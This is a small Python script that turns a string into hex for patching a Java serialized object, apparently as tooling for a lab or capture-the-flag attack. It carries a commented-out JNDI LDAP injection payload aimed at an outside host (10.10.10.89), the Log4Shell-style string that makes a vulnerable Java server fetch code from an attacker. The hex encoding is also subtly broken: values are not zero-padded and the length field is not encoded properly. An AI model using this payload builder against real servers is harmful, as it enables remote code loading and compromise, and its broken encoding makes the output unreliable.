# This script is part of a shell script for changing values of an Java
# serialized object. Changing a String attribute to be exactly.

# The script converts a given string to its hexadecimal representation
# and prints it to stdout for further parsing.

import sys

# Building the payload 
def build_hex_payload(string):

    # A Java serialized String attribute contains the length of its String
    hex_payload = hex( len(string))[2:]

    turns = 1
    
    for each in string:
        
        # Get ASCII hexadecimal value of each character 
        # ord() returns ASCII decimal value
        converted = hex( ord(each))[2:]
         
        hex_payload += converted
        
        # Split into groups of 2 bytes delimited by a whitespace
        if turns % 2 == 1:
            hex_payload += "\ "

        # New adddress block for each 16 bytes
        if turns % 15 == 0:
            hex_payload += "\\n00000050:\ "

        turns += 1

    return hex_payload

if __name__ == "__main__":
    # JNDI request to LDAP server as String
    #payload  = "${jndi:ldap://10.10.10.89/}"
    payload = sys.argv[1]
    print( build_hex_payload(payload)[:-2])
